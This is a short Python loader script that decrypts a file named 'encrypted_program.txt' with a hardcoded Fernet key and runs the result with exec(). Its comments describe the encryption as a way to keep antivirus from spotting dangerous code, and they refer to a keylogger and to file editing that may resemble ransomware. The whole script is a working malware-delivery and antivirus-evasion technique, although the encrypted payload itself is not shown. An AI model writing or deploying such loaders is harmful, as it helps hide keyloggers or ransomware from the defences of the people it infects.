# The cryptography module must be installed with pip.
from cryptography.fernet import Fernet

# The code for my program is encrypted and saved as "encrypted_program.txt"
# The following is the key that I used to encrypt the code. 
# If you want to be able to decrypt it and run it, you must use this exact key!!

encryption_key= "AKQXJZDVl1bRAbM1tTlLp3a4VEHTQY0F8q5xuGpDEEk="
fernet_key = Fernet(encryption_key)


with open("encrypted_program.txt", "rb") as f:
    data = f.read()
    f.close()

data = fernet_key.decrypt(data)

# Now we execute the script which is simply saved as a variable.
# So as far as code is concerned, an anti-virus won't pick-up on any dangerous code.
# However, the antivirus can pick up that there is a keylogger.
# Also, the antivirus can pick up that a program is editing files; that may look like ransomware.

exec(data)